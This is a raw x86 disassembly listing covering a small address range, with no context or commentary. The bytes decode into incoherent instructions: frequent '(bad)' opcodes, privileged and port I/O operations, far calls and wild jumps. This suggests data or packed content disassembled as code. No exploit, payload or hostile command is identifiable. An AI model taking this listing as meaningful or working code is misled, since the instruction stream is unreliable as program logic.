  413130:	ret    0x5713
  413133:	xchg   ebx,eax
  413134:	aam    0x5d
  413136:	lahf   
  413137:	jecxz  0x41311e
  413139:	cmp    ah,al
  41313b:	xchg   ebp,eax
  41313c:	or     eax,DWORD PTR [edi]
  41313e:	int    0x48
  413140:	cmp    al,0xd9
  413142:	repnz add esi,0x8b74ea20
  413149:	fld    TBYTE PTR [eiz*4-0x290d443e]
  413150:	dec    esp
  413151:	and    eax,0xd6799f36
  413156:	imul   ebx,esp,0xffffffcb
  413159:	sub    ebp,DWORD PTR [esi-0x5543743b]
  41315f:	loope  0x4131ce
  413161:	or     ecx,DWORD PTR [bx+di+0x70]
  413165:	lea    esi,[eax-0x50014e7c]
  41316b:	or     DWORD PTR [bp+si],esi
  41316e:	or     al,bl
  413170:	xchg   esi,eax
  413171:	repnz in eax,0xc5
  413174:	les    ecx,FWORD PTR [ebx]
  413176:	dec    ebp
  413177:	mov    edx,DWORD PTR [edi+0x75be96c5]
  41317d:	call   0x5cec:0x6d68d3e6
  413184:	and    DWORD PTR [ecx],esi
  413186:	sbb    DWORD PTR [esi-0x56],ebp
  413189:	sub    BYTE PTR [edx-0x8],ah
  41318c:	jg     0x413134
  41318e:	fsub   DWORD PTR [eax+0x754aa86b]
  413194:	mov    edi,0xb5e34ba4
  413199:	adc    ecx,esi
  41319b:	fisubr WORD PTR [ebx]
  41319d:	in     eax,dx
  41319e:	das    
  41319f:	jb     0x413132
  4131a1:	retf   
  4131a2:	int    0x2e
  4131a4:	je     0x413209
  4131a6:	adc    DWORD PTR [eax-0x5d22d9ae],0x12
  4131ad:	pop    es
  4131ae:	adc    al,0x91
  4131b0:	test   BYTE PTR [edx+0x44],ch
  4131b3:	fstp   DWORD PTR [eax-0x58]
  4131b6:	in     eax,0x20
  4131b8:	stos   BYTE PTR es:[edi],al
  4131b9:	pop    ds
  4131ba:	or     DWORD PTR [ebx-0xe],ebx
  4131bd:	lods   al,BYTE PTR ds:[esi]
  4131be:	inc    BYTE PTR [eax]
  4131c0:	xor    DWORD PTR [ecx],0xffffffd6
  4131c3:	ins    DWORD PTR es:[edi],dx
  4131c4:	cmc    
  4131c5:	imul   edx,DWORD PTR [eax],0xc8370ec6
  4131cb:	daa    
  4131cc:	pop    esi
  4131cd:	push   esp
  4131ce:	sbb    al,0x9b
  4131d0:	cmp    cl,BYTE PTR [eax-0x57]
  4131d3:	or     ecx,DWORD PTR [eax-0x370cced]
  4131d9:	inc    edi
  4131da:	std    
  4131db:	mov    eax,ds:0xc81d4e72
  4131e0:	pop    ss
  4131e1:	inc    edi
  4131e2:	mov    edx,eax
  4131e4:	pop    ss
  4131e5:	out    dx,al
  4131e6:	fwait
  4131e7:	xchg   esp,eax
  4131e8:	push   edi
  4131e9:	(bad)  
  4131eb:	and    cl,dl
  4131ed:	enter  0xc698,0x1
  4131f1:	mov    dh,0xe
  4131f3:	(bad)  
  4131f5:	push   eax
  4131f6:	xchg   ebp,eax
  4131f7:	sbb    edx,DWORD PTR [esi]
  4131f9:	sbb    ecx,DWORD PTR [esi+0x3fb92bfc]
  4131ff:	retf   
  413200:	add    DWORD PTR [edi+esi*8],eax
  413203:	and    eax,0x9870d48c
  413208:	(bad)  
  413209:	(bad)  
  41320a:	and    ebx,DWORD PTR [ebp+0x10e0ec86]
  413210:	ins    BYTE PTR es:[edi],dx
  413211:	or     eax,ebx
  413213:	imul   ebp,ecx,0x5df83736
  413219:	js     0x413270
  41321b:	aaa    
  41321c:	mov    dl,BYTE PTR [eax-0x2fe1b54a]
  413222:	pop    ds
  413223:	ss stos BYTE PTR es:[edi],al
  413225:	pop    eax
  413226:	repnz std 
  413228:	push   esp
  413229:	sahf   
  41322a:	inc    esp
  41322b:	mov    bh,0x66
  41322d:	(bad)  
  41322e:	gs xchg edi,eax
  413230:	js     0x413236
  413232:	rcl    BYTE PTR [esi+0x5e9060d1],1
  413238:	inc    ebp
  413239:	jge    0x413294
  41323b:	out    dx,eax
  41323c:	(bad)  
  41323d:	cmc    
  41323e:	sbb    dh,BYTE PTR [ebp+edx*8+0x25e84a4]
  413245:	mov    ecx,0x38170367
  41324a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41324b:	ja     0x413282
  41324d:	das    
  41324e:	push   esp
  41324f:	dec    esi
  413250:	imul   edx,esi,0x65fa7e8a
  413256:	mov    WORD PTR [edx-0x4],cs
  413259:	pop    esp
  41325a:	push   ebp
  41325b:	inc    ebx
  41325c:	cld    
  41325d:	jmp    0x4dee0f75
  413262:	mov    ecx,0xd7714cc5
  413268:	daa    
  413269:	push   0xffffffb9
  41326b:	mov    dl,0xed
  41326d:	jns    0x413220
  41326f:	(bad)  
  413271:	shl    BYTE PTR [ebx-0x6a6ab7f2],1
  413277:	lods   eax,DWORD PTR ds:[esi]
  413278:	scas   eax,DWORD PTR es:[edi]
  413279:	iret   
  41327a:	mov    gs,WORD PTR [ecx+ebx*8+0x3e]
  41327e:	dec    esi
  41327f:	push   edx
  413280:	je     0x41322f
  413282:	int3   
  413283:	shr    BYTE PTR [eax-0x3db162d6],1
  413289:	mov    ecx,0xec57c642
  41328e:	xor    eax,DWORD PTR [esi+ecx*2+0x3595aefb]
  413295:	xor    al,0x19
  413297:	mov    dh,al
  413299:	aam    0xad
  41329b:	sub    eax,0xb66d314b
  4132a0:	sub    ah,BYTE PTR [ecx]
  4132a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a3:	call   0xb9d8:0x62206f1a
  4132aa:	dec    ecx
  4132ab:	ins    BYTE PTR es:[edi],dx
  4132ac:	push   0x2a
  4132ae:	hlt    
  4132af:	int    0x68
  4132b1:	ss cmc 
  4132b3:	sbb    DWORD PTR [eax],esi
  4132b5:	and    BYTE PTR [esi-0x42b646b4],0x5c
  4132bc:	inc    esi
  4132bd:	inc    edi
  4132be:	mov    cl,cl
  4132c0:	adc    BYTE PTR [esi],dh
  4132c2:	mov    ds:0xdc724d75,eax
  4132c7:	(bad)  
  4132c8:	in     al,dx
  4132c9:	(bad)  
  4132ca:	rcr    BYTE PTR [edx+0x10],0x56
  4132ce:	mov    dh,0xb7
  4132d0:	mov    eax,0xfef6dff9
  4132d5:	popa   
  4132d6:	mov    bl,0x4c
  4132d8:	(bad)  
  4132da:	sub    al,0x65
  4132dc:	cmp    DWORD PTR [edi+0x2c92e05c],ebx
  4132e2:	mov    BYTE PTR [edx],ch
  4132e4:	push   edx
  4132e5:	shl    DWORD PTR [esi-0x32f81ebd],cl
  4132eb:	sbb    cl,BYTE PTR [edi-0x26]
  4132ee:	jle    0x413312
  4132f0:	lds    edi,FWORD PTR [esi-0x1d129fee]
  4132f6:	jns    0x413360
  4132f8:	mov    bh,0x7b
  4132fa:	or     bh,BYTE PTR [esi]
  4132fc:	push   ds
  4132fd:	leave  
  4132fe:	xor    eax,0x147842d
  413303:	(bad)  
  413304:	in     al,0x6f
  413306:	xchg   ecx,eax
  413307:	int    0x9f
  413309:	mov    ds:0x32777a0f,eax
  41330e:	imul   esp,DWORD PTR [ecx+0x3567eeb3],0x34
  413315:	adc    al,0xdf
  413317:	gs and ax,0x8ba4
  41331c:	stos   DWORD PTR es:[edi],eax
  41331d:	test   BYTE PTR [esi+0x6b],ah
  413320:	fsub   st,st(0)
  413322:	call   0xe306:0xddcbf302
  413329:	pop    ebx
  41332a:	xor    ebx,DWORD PTR [esi-0x21]
  41332d:	mov    eax,DWORD PTR [ebx+0x8dd80f9]
  413333:	rcl    DWORD PTR [ecx+edi*8+0x3e],0xac
  413338:	xor    DWORD PTR ss:[edi],edx
  41333b:	iret   
  41333c:	and    al,0x79
  41333e:	xchg   DWORD PTR [esi],esp
  413340:	pop    ds
  413341:	shr    DWORD PTR [ecx+edx*8+0x2e7dc27d],cl
  413348:	add    ebx,DWORD PTR [ebx-0x7b]
  41334b:	mov    ah,0xce
  41334d:	add    al,0x20
  41334f:	push   edx
  413350:	push   eax
  413351:	mov    edx,ecx
  413353:	enter  0xc040,0x86
  413357:	mov    esi,0xd1a42cc4
  41335c:	sub    DWORD PTR [eax+eax*4-0x25],edi
  413360:	mov    dh,0x29
  413362:	int    0x96
  413364:	push   ebp
  413365:	sub    dl,BYTE PTR [esi]
  413367:	push   0xffffffb1
  413369:	das    
  41336a:	jbe    0x41336e
  41336c:	js     0x413335
  41336e:	std    
  41336f:	cdq    
  413370:	push   cs
  413371:	xor    DWORD PTR [edi-0x31dbf2d0],ecx
  413377:	cmc    
  413378:	inc    ecx
  413379:	fisubr DWORD PTR [esi+ebx*2-0x1c499262]
  413380:	adc    DWORD PTR [ecx],eax
  413382:	cmp    BYTE PTR [ecx-0x661684bf],bl
  413388:	jmp    0x818c57b6
  41338d:	out    dx,al
  41338e:	xlat   BYTE PTR ds:[ebx]
  41338f:	cmp    eax,0x9a63b7c8
  413394:	push   ebx
  413395:	sbb    edx,DWORD PTR ds:0x26e0bdf8
  41339b:	outs   dx,DWORD PTR ds:[esi]
  41339c:	jge    0x413337
  41339e:	pop    es
  41339f:	xlat   BYTE PTR ds:[ebx]
  4133a0:	ins    DWORD PTR es:[edi],dx
  4133a1:	mov    bl,0x1d
  4133a3:	(bad)  
  4133a4:	and    al,0x94
  4133a6:	dec    edi
  4133a7:	ret    
  4133a8:	cld    
  4133a9:	(bad)  
  4133aa:	xor    al,BYTE PTR [edi]
  4133ac:	xchg   ebx,eax
  4133ad:	and    ecx,DWORD PTR [ebx-0x7a]
  4133b0:	bound  edi,QWORD PTR [edi-0x16ee56b9]
  4133b6:	xchg   edx,eax
  4133b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b8:	addr16 ss pop ecx
  4133bb:	mov    edx,0x1a217f00
  4133c0:	sti    
  4133c1:	cmp    eax,0x8364b344
  4133c6:	pop    ds
  4133c7:	sbb    esp,DWORD PTR [esi]
  4133c9:	jns    0x4133bd
  4133cb:	arpl   WORD PTR [eax],bx
  4133cd:	or     cl,BYTE PTR [ebx]
  4133cf:	fwait
  4133d0:	xor    eax,0x8480c6ff
  4133d5:	and    edx,DWORD PTR [eax-0x61ca41cc]
  4133db:	lods   eax,DWORD PTR ds:[esi]
  4133dc:	sar    DWORD PTR [ebx-0x4],0xd6
  4133e0:	lods   eax,DWORD PTR ds:[esi]
  4133e1:	mov    ebp,0xfca9f2a2
  4133e6:	loop   0x413409
  4133e8:	shl    DWORD PTR fs:[ebp-0x50b746e0],cl
  4133ef:	push   ebp
  4133f0:	push   ebp
  4133f1:	idiv   DWORD PTR [eax+edx*8]
  4133f4:	mov    dh,0x48
  4133f6:	pushf  
  4133f7:	js     0x413429
  4133f9:	add    DWORD PTR ds:0xcab03a4e,eax
  4133ff:	mov    es,WORD PTR [edx]
  413401:	(bad)  
  413402:	xlat   BYTE PTR ds:[ebx]
  413403:	not    DWORD PTR [eax+0x74]
  413406:	xor    DWORD PTR [ebp-0x76ce8f71],ebp
  41340c:	fbstp  TBYTE PTR ds:0xa7d5d600
  413412:	xchg   ebx,eax
  413413:	loope  0x413437
  413415:	cmp    BYTE PTR [ebp+0xbbee2e6],bl
  41341b:	push   esi
  41341c:	cmp    BYTE PTR [edi],dh
  41341e:	xchg   BYTE PTR [ebp+0x6a3d3179],ah
  413424:	je     0x413403
  413426:	sub    DWORD PTR [ebp+0x79f7e929],ebp
  41342c:	xchg   bh,bh
  41342e:	push   ebp
  41342f:	sti    
  413430:	pop    ds
  413431:	sub    BYTE PTR [ebp+eiz*4-0x31fff628],bl
  413438:	sbb    BYTE PTR [ebp-0x3c27e9b8],bl
  41343e:	mov    al,0x8e
  413440:	les    eax,FWORD PTR [edi]
  413442:	into   
  413443:	cmp    DWORD PTR [edi],ecx
  413445:	lds    esp,FWORD PTR [ecx]
  413447:	xor    BYTE PTR [ecx+0x7265f643],0xf4
  41344e:	jg     0x413424
  413450:	les    ebp,FWORD PTR es:[eax-0x38]
  413454:	xchg   ebx,eax
  413455:	and    eax,0xd5a80e56
  41345a:	lock cmc 
  41345c:	fwait
  41345d:	imul   ecx,DWORD PTR [ecx+eiz*2-0x34001b66],0x3b
  413465:	or     BYTE PTR [edi+0x6b0bf800],cl
  41346b:	mov    DWORD PTR [ebx],esi
  41346d:	cwde   
  41346e:	icebp  
  41346f:	fwait
  413470:	add    BYTE PTR [esi-0x7299728c],bl
  413476:	mov    ds:0x64a8a800,eax
  41347b:	aam    0xc
  41347d:	in     al,dx
  41347e:	xchg   esp,eax
  41347f:	imul   esp,DWORD PTR gs:[ebx-0x53],0xad58bffc
  413487:	out    0xb9,eax
  413489:	dec    esi
  41348a:	or     edx,DWORD PTR [ebp+0x38]
  41348d:	call   0x25b0f892
  413492:	out    dx,eax
  413493:	push   0x56902118
  413498:	clc    
  413499:	imul   ecx,esp,0x3c2feac3
  41349f:	mov    DWORD PTR [ecx+0x1c4738a3],ebx
  4134a5:	test   eax,0x25042f0
  4134aa:	jp     0x413528
  4134ac:	and    eax,0x595aa5e0
  4134b1:	cmovbe ecx,edi
  4134b4:	stc    
  4134b5:	cmp    DWORD PTR [ecx+0x5f0c85db],esi
  4134bb:	cmp    al,0x6
  4134bd:	stc    
  4134be:	ret    0x28ab
  4134c1:	cmp    DWORD PTR [esi+0x68],0xa6cbadd
  4134c8:	mov    dh,cl
  4134ca:	fs mov esi,0x46ba70d9
  4134d0:	xchg   ecx,eax
  4134d1:	dec    ebp
  4134d2:	mov    ebp,0x9ff3f91d
  4134d7:	xor    eax,edi
  4134d9:	adc    ch,cl
  4134db:	and    edx,ecx
  4134dd:	mov    bl,0xa5
  4134df:	cmp    dh,BYTE PTR [ebp+eax*4+0x2d]
  4134e3:	adc    dl,BYTE PTR [ecx+ecx*1]
  4134e6:	loop   0x4134ab
  4134e8:	push   eax
  4134e9:	mov    bh,0x5c
  4134eb:	ret    0xbf25
  4134ee:	aas    
  4134ef:	jecxz  0x413478
  4134f1:	addr16 mov edi,0xd51ea014
  4134f7:	sahf   
  4134f8:	or     DWORD PTR [edx-0x51],ebp
  4134fb:	stos   DWORD PTR es:[edi],eax
  4134fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134fd:	pushf  
  4134fe:	out    dx,eax
  4134ff:	mov    ds:0xa83f677,eax
  413504:	imul   esi,DWORD PTR [eax],0x151f01f7
  41350a:	xor    ebx,DWORD PTR [esi+eiz*4+0x9f3bce4]
  413511:	jno    0x413558
  413513:	add    esp,esi
  413515:	pusha  
  413516:	push   0x37
  413518:	xchg   BYTE PTR [eax+ebp*1+0x3c9d099e],bl
  41351f:	mov    esi,0x984bd91a
  413524:	jae    0x4134d5
  413526:	loop   0x413506
  413528:	pop    ebx
  413529:	jmp    0x9167:0x2ce1c58f
  413530:	xchg   ebx,eax
  413531:	retf   
  413532:	jno    0x4135b1
  413534:	repnz sbb bl,BYTE PTR [ecx+0x421f43e9]
  41353b:	mov    ebp,0xfe1fc0ac
  413540:	idiv   DWORD PTR [esi+eiz*8]
  413543:	sbb    al,0x21
  413545:	push   edi
  413546:	or     BYTE PTR [edx+0x5d350970],dh
  41354c:	fbstp  TBYTE PTR [ebp-0x75]
  41354f:	push   edx
  413550:	iret   
  413551:	inc    eax
  413552:	cli    
  413553:	nop
  413554:	clc    
  413555:	xchg   esi,eax
  413556:	fld    DWORD PTR [edx+0x3a607235]
  41355c:	fisttp WORD PTR [eax+0x15]
  41355f:	mov    bh,0xfe
  413561:	cdq    
  413562:	xor    ch,0x98
  413565:	sbb    cl,BYTE PTR [eax]
  413567:	mov    ebx,0x10049257
  41356c:	shl    cl,0xdb
  41356f:	cmp    BYTE PTR [ecx-0x545f24c7],bl
  413575:	adc    eax,0x153bccf7
  41357a:	ja     0x4134fc
  41357c:	push   0x52
  41357e:	pop    esp
  41357f:	dec    esi
  413580:	mov    eax,?
  413582:	sti    
  413583:	fld    TBYTE PTR [edx+ebp*4]
  413586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413587:	and    ecx,eax
  413589:	jae    0x413607
  41358b:	pop    eax
  41358c:	push   edi
  41358d:	lds    esi,FWORD PTR [esi-0x5e]
  413590:	shr    DWORD PTR [edi+0x23768757],1
  413596:	repnz lods eax,DWORD PTR ds:[esi]
  413598:	pop    ebp
  413599:	(bad)  
  41359a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41359b:	xchg   esi,eax
  41359c:	(bad)  [edx]
  41359e:	loop   0x41361e
  4135a0:	int    0xe9
  4135a2:	pop    edx
  4135a3:	stos   DWORD PTR es:[edi],eax
  4135a4:	push   esi
  4135a5:	dec    eax
  4135a6:	retf   
  4135a7:	retf   0x6297
  4135aa:	dec    ebx
  4135ab:	clc    
  4135ac:	jg     0x413536
  4135ae:	mov    ebx,0x7a044ef3
  4135b3:	inc    ebx
  4135b4:	cmp    al,0xea
  4135b6:	fcomip st,st(4)
  4135b8:	pop    edi
  4135b9:	and    ebx,DWORD PTR [eax]
  4135bb:	scas   al,BYTE PTR es:[edi]
  4135bc:	and    eax,0xd6849bb8
  4135c1:	daa    
  4135c2:	jnp    0x41360d
  4135c4:	jge    0x413583
  4135c6:	mov    ecx,0xe87d93c5
  4135cb:	scas   al,BYTE PTR es:[edi]
  4135cc:	(bad)  
  4135cd:	pop    eax
  4135ce:	and    DWORD PTR [edi-0x4c8a6879],edi
  4135d4:	adc    edi,ebp
  4135d6:	call   0x5826:0x82a480d5
  4135dd:	es mov ah,0x9e
  4135e0:	adc    al,0x84
  4135e2:	or     cl,BYTE PTR [ebx]
  4135e4:	imul   esi,DWORD PTR [ebx+0x14],0xffffff9d
  4135e8:	inc    edx
  4135e9:	inc    edx
  4135ea:	test   DWORD PTR [edx-0x646e6f16],esp
  4135f0:	pop    ebx
  4135f1:	mov    ah,0x47
  4135f3:	pop    ecx
  4135f4:	xor    dh,BYTE PTR [ebp-0x49]
  4135f7:	inc    esp
  4135f8:	cmp    DWORD PTR [ecx+0xf],0x58
  4135fc:	xlat   BYTE PTR ds:[ebx]
  4135fd:	int3   
  4135fe:	bound  edi,QWORD PTR [ecx+0x78]
  413601:	push   esi
  413602:	xchg   edx,eax
  413603:	int    0xb3
  413605:	inc    edx
  413606:	pop    edi
  413607:	and    dl,dl
  413609:	cmp    esp,DWORD PTR [edx+0x1c98952d]
  41360f:	jo     0x4135c4
  413611:	pusha  
  413612:	(bad)  
  413613:	mov    ebp,0xece68646
  413618:	dec    ebp
  413619:	push   esp
  41361a:	xchg   edi,eax
  41361b:	jbe    0x4135e5
  41361d:	cmp    BYTE PTR [edx-0x2ef878f1],bl
  413623:	mov    cl,0xa0
  413625:	(bad)
  413629:	mov    ecx,0x736d46a
  41362e:	js     0x4135c6
  413630:	mov    ebx,0xb72e842c
  413635:	adc    bl,ah
  413637:	ficom  DWORD PTR [ebp-0x22]
  41363b:	mov    eax,0x12c2cb9
  413640:	mov    cl,0x12
  413642:	push   0xffffffad
  413644:	push   ecx
  413645:	mov    ch,cl
  413647:	scas   eax,DWORD PTR es:[edi]
  413648:	cmc    
  413649:	iret   
  41364a:	inc    eax
  41364b:	adc    eax,0x810ccc73
  413650:	jmp    0x35457146
  413655:	jbe    0xa080d444
  41365b:	mov    DWORD PTR [edi],edi
  41365d:	jp     0x413604
  41365f:	and    eax,ebx
  413661:	inc    ecx
  413662:	gs shl edi,cl
  413665:	push   esi
  413666:	mov    cl,0xcc
  413668:	das    
  413669:	mov    al,0x90
  41366b:	imul   ebx,DWORD PTR [ecx+ebp*8],0x69
  41366f:	sbb    dl,BYTE PTR [edx+0x2e]
  413672:	scas   al,BYTE PTR es:[edi]
  413673:	dec    BYTE PTR [ebp+0x45]
  413676:	pop    es
  413677:	cmp    BYTE PTR [ebx+0x5bdf8515],ch
  41367d:	sahf   
  41367e:	ror    DWORD PTR [eax],1
  413680:	mov    esp,0x22763dea
  413685:	es pop ecx
  413687:	data16 aam 0x6f
  41368a:	xor    ch,BYTE PTR [edi]
  41368c:	ss scas al,BYTE PTR es:[edi]
  41368e:	dec    esp
  41368f:	dec    eax
  413690:	sbb    ebp,DWORD PTR [ebx-0x7a]
  413693:	jns    0x413633
  413695:	sbb    BYTE PTR [ebx],al
  413697:	(bad)  [esi+edi*8]
  41369a:	adc    DWORD PTR [eax],esi
  41369c:	call   0x91d9:0xcccf36c
  4136a3:	(bad)  
  4136a4:	xchg   esi,eax
  4136a5:	lds    edi,FWORD PTR [eax+eax*4+0x61]
  4136a9:	outs   dx,DWORD PTR ds:[esi]
  4136aa:	aam    0xa3
  4136ac:	xchg   ebx,eax
  4136ad:	mov    ecx,DWORD PTR [ebx+ecx*1+0x168a15f3]
  4136b4:	ret    
  4136b5:	inc    ebp
  4136b6:	scas   al,BYTE PTR es:[edi]
  4136b7:	pop    ebx
  4136b8:	pop    eax
  4136b9:	(bad)  
  4136ba:	lahf   
  4136bb:	cmp    eax,0x4ce28871
  4136c0:	sub    cl,BYTE PTR [esi+0x5fb00a2a]
  4136c6:	mov    cl,0xa0
  4136c8:	outs   dx,BYTE PTR ds:[esi]
  4136c9:	mov    al,0x7a
  4136cb:	adc    al,0xe7
  4136cd:	nop
  4136ce:	adc    eax,0xd8dbc9a3
  4136d3:	inc    edx
  4136d4:	pop    ss
  4136d5:	mov    bl,0xca
  4136d7:	shl    BYTE PTR [ebp+0x40],cl
  4136da:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4136dc:	add    eax,DWORD PTR [esi+0x78]
  4136df:	pop    esi
  4136e0:	mov    al,ds:0x9f40dab4
  4136e5:	pop    ecx
  4136e6:	xchg   BYTE PTR [edi],ch
  4136e8:	xor    eax,0x527e30ca
  4136ed:	and    BYTE PTR [edi],al
  4136ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f0:	scas   al,BYTE PTR es:[edi]
  4136f1:	ja     0x413687
  4136f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136f4:	mov    ds:0xd2116dd4,eax
  4136f9:	xchg   esp,ebp
  4136fb:	fst    DWORD PTR [ebx]
  4136fd:	pop    ebx
  4136fe:	mov    WORD PTR [ecx],cs
  413700:	icebp  
  413701:	imul   edx,DWORD PTR ds:0x739e96df,0xffffffc7
  413708:	or     DWORD PTR [ecx],edi
  41370a:	fsubr  DWORD PTR [eax+0x16]
  41370d:	dec    esi
  41370e:	push   edi
  41370f:	out    dx,eax
  413710:	ins    DWORD PTR es:[edi],dx
  413711:	sub    al,0x82
  413713:	pop    edi
  413714:	sahf   
  413715:	sub    eax,0xdacab380
  41371a:	sub    eax,0xa9b179d6
  41371f:	push   0xa9ee0b25
  413724:	imul   esi,DWORD PTR [eax+ecx*2+0x1d66161a],0xc5fe5059
  41372f:	lahf   
  413730:	pusha  
  413731:	adc    DWORD PTR [esi+0x28],0xbee1cb64
  413738:	mov    al,ds:0x7e876991
  41373d:	pop    ecx
  41373e:	inc    ebp
  41373f:	rol    BYTE PTR [ebp+0x526d8d8d],1
  413745:	out    0xf3,eax
  413747:	js     0x41375e
  413749:	sbb    al,0x0
  41374b:	jo     0x41371b
  41374d:	inc    ebx
  41374e:	cs mov bl,0xce
  413751:	(bad)  
  413752:	hlt    
  413753:	sbb    edi,eax
  413755:	push   cs
  413756:	and    DWORD PTR [esi+0x1d],eax
  413759:	lods   al,BYTE PTR ds:[esi]
  41375a:	ret    
  41375b:	adc    bl,BYTE PTR [esp+eax*1-0x62f6d4b7]
  413762:	add    BYTE PTR [eax],bh
  413764:	inc    edi
  413765:	call   0x4f05:0x668803a7
  41376c:	std    
  41376d:	ss xchg ebx,eax
  41376f:	ins    DWORD PTR es:[edi],dx
  413770:	cmp    al,0x54
  413772:	or     dh,cl
  413774:	mov    al,0x9f
  413776:	mov    edi,0x3a37eb2f
  41377b:	fsub   QWORD PTR [esi-0x663675aa]
  413781:	mov    cl,0x9a
  413783:	mov    BYTE PTR [eax+0x37005904],al
  413789:	sub    DWORD PTR [ebp+0x5396a259],0x70
  413790:	pushf  
  413791:	lahf   
  413792:	out    dx,al
  413793:	scas   eax,DWORD PTR es:[edi]
  413794:	loope  0x413718
  413796:	fwait
  413797:	dec    ebp
  413798:	jl     0x4137aa
  41379a:	pusha  
  41379b:	xor    al,0x7a
  41379d:	xchg   BYTE PTR [bp+si+0x10],ah
  4137a1:	xor    edx,0xbace85a8
  4137a7:	aas    
  4137a8:	in     eax,dx
  4137a9:	ret    0x1777
  4137ac:	push   esi
  4137ad:	cmp    BYTE PTR [edx-0x1b],ah
  4137b0:	xchg   esp,eax
  4137b1:	mov    ds:0xbd73d4f3,eax
  4137b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b7:	push   edx
  4137b8:	fcom   DWORD PTR [edx+0x26]
  4137bb:	popa   
  4137bc:	adc    DWORD PTR [edi-0x5b7131cc],ecx
  4137c2:	iret   
  4137c3:	into   
  4137c4:	int    0x96
  4137c6:	or     eax,0x440bd75a
  4137cb:	aaa    
  4137cc:	mov    ebp,0xb60e4a7b
  4137d1:	cmp    al,0x8a
  4137d3:	es jg  0x413774
  4137d6:	imul   esp,DWORD PTR ds:0xf4b7c75b,0xc17bca93
  4137e0:	mov    dh,0x5d
  4137e2:	lods   al,BYTE PTR ds:[esi]
  4137e3:	(bad)  
  4137e5:	or     al,0xda
  4137e7:	popf   
  4137e8:	gs sub eax,eax
  4137eb:	adc    eax,0xa891e1bb
  4137f0:	xor    DWORD PTR [eax+0x11c50494],eax
  4137f6:	sbb    bh,BYTE PTR [ebx-0x5dd587bb]
  4137fc:	jl     0x413857
  4137fe:	mov    eax,ds:0xecd5785b
  413803:	in     eax,0x5
  413805:	test   BYTE PTR [esi],dh
  413807:	push   edi
  413808:	jns    0x4137fc
  41380a:	outs   dx,DWORD PTR ds:[esi]
  41380b:	push   es
  41380c:	xchg   BYTE PTR [esi-0x7289712d],ch
  413812:	cmp    al,0xc7
  413814:	xor    esi,esp
  413816:	jbe    0x41380c
  413818:	add    DWORD PTR [eax-0x18],edi
  41381b:	add    edi,esp
  41381d:	retf   0xc3c
  413820:	sar    BYTE PTR [ecx+0x54],1
  413823:	popa   
  413824:	outs   dx,DWORD PTR ds:[esi]
  413825:	inc    ebp
  413826:	cld    
  413827:	and    al,0xe8
  413829:	cmc    
  41382a:	ret    
  41382b:	and    al,0x39
  41382d:	into   
  41382e:	sbb    eax,0xcccfdde4
  413833:	dec    ebp
  413834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413835:	sbb    ebp,DWORD PTR [ebx-0x51]
  413838:	icebp  
  413839:	lea    ebx,[edx]
  41383b:	lea    esi,[ecx]
  41383d:	jmp    0x41383e
  41383f:	lahf   
  413840:	or     bh,dl
  413842:	push   ecx
  413843:	fistp  DWORD PTR [edi+0x561e3640]
  413849:	xchg   edi,eax
  41384a:	imul   ebp,DWORD PTR [ebx-0x65],0x71
  41384e:	dec    edi
  41384f:	jge    0x4138b3
  413851:	push   ss
  413852:	adc    eax,0x9b2813b5
  413857:	dec    edi
  413858:	cdq    
  413859:	xchg   ecx,eax
  41385a:	push   edx
  41385b:	push   edi
  41385c:	out    dx,al
  41385d:	push   0x21
  41385f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413860:	fild   QWORD PTR [edx+0x68766807]
  413866:	sub    eax,0x1aacba4
  41386b:	push   0x25ccc02b
  413870:	dec    esi
  413871:	inc    esi
  413872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413873:	cmp    bl,BYTE PTR [edi+0x21d7cce4]
  413879:	nop
  41387a:	ds dec edi
  41387c:	stos   DWORD PTR es:[edi],eax
  41387d:	mov    al,0xe1
  41387f:	fidivr WORD PTR gs:[edx+0x76b620c0]
  413886:	cdq    
  413887:	es (bad) 
  413889:	imul   esi,DWORD PTR [edi-0x30],0x59
  41388d:	mov    eax,ds:0x6d21774a
  413892:	mov    ebx,0xfcb29154
  413897:	call   0x2c5ad3d6
  41389c:	sub    DWORD PTR [esi+0x35],0xf497d20
  4138a3:	push   eax
  4138a4:	arpl   bp,cx
  4138a6:	ror    BYTE PTR [eax+0x443cd832],cl
  4138ac:	fidivr DWORD PTR [edx+eax*1-0x721f5482]
  4138b3:	(bad)  
  4138b5:	not    DWORD PTR [ebx+0x49]
  4138b8:	scas   eax,DWORD PTR es:[edi]
  4138b9:	retf   0x42ed
  4138bc:	hlt    
  4138bd:	dec    edi
  4138be:	popa   
  4138bf:	and    eax,0x35113095
  4138c4:	imul   edx,DWORD PTR [ecx+0x7f],0xa6e7c2
  4138cb:	pop    edx
  4138cc:	outs   dx,BYTE PTR ds:[esi]
  4138cd:	and    bl,BYTE PTR [ebp+0x12b4a1d8]
  4138d3:	inc    ecx
  4138d4:	xchg   esp,eax
  4138d5:	(bad)  
  4138d6:	call   0x7ae54850
  4138db:	add    DWORD PTR [ebx],ecx
  4138dd:	enter  0x498f,0xac
  4138e1:	js     0x41391e
  4138e3:	jmp    0x647b3749
  4138e8:	dec    ebx
  4138e9:	mov    bh,0xd6
  4138eb:	retf   
  4138ec:	or     BYTE PTR [esi-0x2f],ah
  4138ef:	pushf  
  4138f0:	fst    QWORD PTR [edi+0x61]
  4138f3:	pop    esp
  4138f4:	mov    DWORD PTR [eax-0x62],esi
  4138f7:	gs dec edx
  4138f9:	lahf   
  4138fa:	sbb    eax,0x7b80d847
  4138ff:	(bad)  
  413900:	fidivr DWORD PTR [ebp-0x3f]
  413903:	popa   
  413904:	mov    esp,esp
  413906:	xchg   ecx,eax
  413907:	dec    ecx
  413908:	pushf  
  413909:	(bad)  
  41390a:	adc    al,0x10
  41390c:	hlt    
  41390d:	arpl   WORD PTR [ecx],bx
  41390f:	ret    
  413910:	and    DWORD PTR [esi+0x42cba572],edi
  413916:	xchg   esi,eax
